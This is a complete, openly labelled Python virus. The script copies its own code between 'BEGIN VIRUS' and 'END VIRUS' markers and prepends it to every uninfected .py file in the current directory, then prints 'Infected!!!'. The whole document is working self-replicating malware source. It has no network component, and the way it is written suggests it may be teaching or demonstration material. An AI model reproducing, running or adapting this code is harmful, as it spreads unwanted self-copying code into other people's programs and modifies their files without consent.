#!/usr/bin/env python

### BEGIN VIRUS ###

import sys, glob, re

# Copy the virus
vCode = []
fh = open(sys.argv[0], 'r')
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if (re.search("^### BEGIN VIRUS ###", line)): inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search("^### END VIRUS ###", line)): break
        
# Find potential victims
progs = glob.glob("*.py")

# Check and infect
for prog in progs:
    fh = open(prog, 'r')
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if("### BEGIN VIRUS ###" in line):
            infected = True
            break
    if not infected:
        newCode = []
        if("#!" in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

# Optional payload
print("Infected!!!")

### END VIRUS ###
